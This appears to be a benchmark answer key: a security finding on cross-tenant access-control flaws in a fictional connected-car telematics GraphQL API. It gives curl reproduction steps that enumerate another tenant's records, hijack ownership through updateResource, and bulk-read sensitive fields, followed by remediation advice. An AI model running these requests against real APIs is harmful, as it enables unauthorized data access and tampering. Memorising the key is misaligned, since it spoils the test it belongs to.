# Expected Response

## System
- Domain: Automotive / Connected Car
- System: AetherDrive V2X Telematics
- Example ID: GQL-0055

## Priority Findings

### Finding 1: Metadata/Attribute Side-Channel via listResources + Cross-Tenant Write via updateResource (Pattern 2.2)
**Severity:** Critical
**Category:** BAC / Metadata Side-Channel

**Summary:**
The AetherDrive V2X Telematics API exposes `listResources` with partial data for unauthorized objects, leaking the existence and metadata of telematics records the caller should not know about (Pattern 2.2 — metadata/attribute side-channel). An attacker from `tenant-58a5` targeted V2X telematics record `R-2055` (belonging to `tenant-c622`), issuing `updateResource` with `status: "approved"` and `ownerId: "attacker-58a5c622"`. The response confirms cross-tenant write. In connected car V2X systems, writing status to telematics records can interfere with vehicle communication and safety systems.

**Evidence from HAR:**
- Request: `POST https://api.aetherdrive-v2x-tele.example.com/graphql` (2026-04-13T16:22:34Z)
- JWT `x-tenant-id`: `tenant-58a5` — attacker's identity
- Mutation payload: `updateResource(id: "R-2055", input: {status: "approved", ownerId: "attacker-58a5c622"})` — cross-tenant V2X record write
- Response HTTP status: `200 OK`
- Response `tenantId`: `tenant-c622`
- Response `ownerId`: `other-user-58a5c622`
- Response `sensitiveField`: `CONFIDENTIAL-58a5c622` — telematics data disclosed
- Response `internalNotes`: `Internal data exposed`
- `x-request-id`: `req-58a5c622`

**Root Cause (§4.0 RISK-GQL-055 + §5.0):** "The GraphQL schema exposes `listResources` with partial data even for unauthorised objects, leaking the existence and metadata of records the user should not know about." The same missing tenant check enables direct cross-tenant writes.

**Evidence Map:**
| Artifact | Location | Detail |
|---|---|---|
| context.txt §4.0 | RISK-GQL-055 | "resolver does NOT verify tenantId against JWT's tenantId" |
| context.txt §5.0 | Pattern 2.2 | "`listResources` exposes partial data for unauthorised objects — metadata side-channel" |
| HAR entry | request.postData | `updateResource(id: "R-2055", input: {status: "approved", ownerId: "attacker-58a5c622"})` |
| HAR entry | response.content | `tenantId: "tenant-c622"`, `200 OK` |

---

## Steps to Reproduce

### Step 1 — Metadata side-channel: listResources exposes cross-tenant existence
```bash
curl -s -X POST https://api.aetherdrive-v2x-tele.example.com/graphql \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" \
  -H "x-tenant-id: tenant-58a5" \
  -d '{"query": "query { listResources(tenantId: \"tenant-c622\") { resourceId status } }"}'
```
**Vulnerable outcome:** Returns partial data (`resourceId`, `status`) for `tenant-c622` V2X records — reveals existence and state of unauthorized objects.
**Secure outcome:** FORBIDDEN or empty list.

### Step 2 — Cross-tenant V2X telematics write (HAR attack)
```bash
curl -s -X POST https://api.aetherdrive-v2x-tele.example.com/graphql \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" \
  -H "x-tenant-id: tenant-58a5" \
  -d '{"query": "mutation { updateResource(id: \"R-2055\", input: {status: \"approved\", ownerId: \"attacker-58a5c622\"}) { resourceId status tenantId } }"}'
```
**Vulnerable outcome:** `200 OK`, `R-2055` (tenant-c622) updated to `approved`, ownerId hijacked.
**Secure outcome:** FORBIDDEN.

### Step 3 — Bulk cross-tenant enumeration
```bash
curl -s -X POST https://api.aetherdrive-v2x-tele.example.com/graphql \
  -H "Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3Jfe3VpZH0iLCJyb2xlIjoie3JvbGV9IiwidGVuYW50X2lkIjoie3RlbmFudH0ifQ.SIG" \
  -H "Content-Type: application/json" \
  -H "x-tenant-id: tenant-58a5" \
  -d '{"query": "mutation { bulkResourceLookup(ids: [\"R-2055\", \"R-c622-002\"]) { resourceId tenantId data { sensitiveField } } }"}'
```
**Vulnerable outcome:** Returns V2X records from `tenant-c622`.

## Remediation
1. **Remove tenantId from listResources input:** The partial data side-channel is closed by ensuring `listResources` only returns JWT-scoped records.
2. **Resolver tenant guard on updateResource:** `WHERE resource_id = $id AND tenant_id = $jwt.tenantId`.
3. **Strip ownerId from ResourceInput.**
4. **Per-ID ownership filter in bulkResourceLookup.**
5. **Redis cache key includes tenantId:** §2.0 caches by `resourceId` only.
